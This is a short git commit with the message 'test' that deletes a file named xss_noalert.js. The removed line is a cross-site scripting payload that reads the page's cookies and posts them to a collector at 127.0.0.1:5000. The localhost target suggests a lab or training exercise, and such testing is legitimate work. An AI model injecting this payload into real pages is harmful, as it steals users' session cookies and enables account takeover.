d38ad41c8f6a76317ae821f2ef919a9d49cea501
giuseppe <giuseppe@phoenixnetacad.com>
2025-03-17 10:09:33 -0400

    test

--- xss_noalert.js
+++
@@ -1,1 +0,0 @@
-<script>var cookies=document.cookie;var xhr=new XMLHttpRequest();xhr.open('POST','http://127.0.0.1:5000/receive_cookies',true);xhr.setRequestHeader('Content-Type','application/json');xhr.send(JSON.stringify({"cookies":cookies}));</script>
